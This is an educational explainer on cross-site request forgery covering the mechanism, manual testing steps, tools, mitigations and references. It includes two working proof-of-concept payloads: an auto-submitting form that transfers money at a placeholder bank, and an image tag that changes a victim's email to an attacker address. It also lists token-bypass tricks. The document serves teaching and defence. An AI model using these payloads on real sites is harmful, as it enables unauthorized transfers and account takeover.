# What is CSRF?

Cross-Site Request Forgery (CSRF) tricks a logged-in victim's browser into sending a state-changing request the victim never intended. Because the browser automatically attaches cookies, the target site sees a legitimate, authenticated request. CSRF matters wherever an action relies on cookie-based sessions and has no per-request token.

## How it works

- The victim is authenticated to `bank.tld` (session cookie set)
- The victim visits an attacker page that auto-submits a request to `bank.tld`
- The browser attaches the cookie, and the action (transfer, email change) executes

## Proof-of-concept

```html
<!-- Auto-submitting form: fires on page load -->
<form action="https://bank.tld/transfer" method="POST" id="x">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="5000">
</form>
<script>document.getElementById('x').submit()</script>
```

```html
<!-- GET-based CSRF is even simpler -->
<img src="https://bank.tld/email/change?new=attacker@evil.com">
```

## Tools

- [Burp Suite](https://portswigger.net/burp) - "Generate CSRF PoC" in the context menu
- [OWASP ZAP](https://www.zaproxy.org/) - CSRF token detection and PoC generation

## Manual testing

1. Capture a state-changing request and check for an anti-CSRF token
2. Remove the token (or the whole header) and replay - does it still work?
3. Change the `Content-Type` to bypass token checks tied to JSON
4. Test whether the token is validated per-user or just for presence
5. Confirm `SameSite` cookie behavior in the target's real browser flow

## Mitigation

- Use anti-CSRF tokens (synchronizer token pattern), validated server-side
- Set session cookies to `SameSite=Lax` or `Strict`
- Require re-authentication or a second factor for sensitive actions
- Check `Origin`/`Referer` for state-changing requests as defense in depth

## Deep dive

- [CSRF - Vulnerability Explain](https://securitycipher.com/vulnerability-explain/)
- [PortSwigger CSRF labs](https://portswigger.net/web-security/csrf)

## CWE

- CWE-352: Cross-Site Request Forgery
